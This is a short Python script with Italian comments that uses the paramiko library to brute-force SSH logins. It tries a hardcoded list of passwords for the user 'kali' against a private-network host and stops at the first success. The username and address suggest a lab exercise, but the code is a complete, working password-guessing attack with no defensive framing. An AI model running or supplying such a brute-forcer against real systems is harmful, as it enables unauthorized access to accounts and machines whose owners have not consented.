import paramiko                                                         # Libreria per connessioni SSH

def test_authentication(username, hostname, password):                  # Funzione per testare autenticazione SSH   
    client = paramiko.SSHClient()                                       # Crea client SSH
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())        # Accetta host sconosciuti

    try:
        client.connect(hostname, username=username, password=password)  # Prova login SSH
        print(f"Authentication successful: {username}:{password}")      # Login riuscito
        return True

    except paramiko.AuthenticationException:                            # Login fallito
        print(f"Authentication failed: {username}:{password}")          # Login fallito con stampa
        return False                                                    

    finally:                                              
        client.close()                                                  # Chiude la connessione

# Prova una lista di password finché una funziona

passwords = ["password", "123554", "password2", "kali", "ciaociao", "1231234123", "udsaiodu"]
for p in passwords:                                                     #Ciclo sulle password
    if test_authentication("kali", "192.168.50.100", p):
        break                                                           # Interrompe se trova la password giusta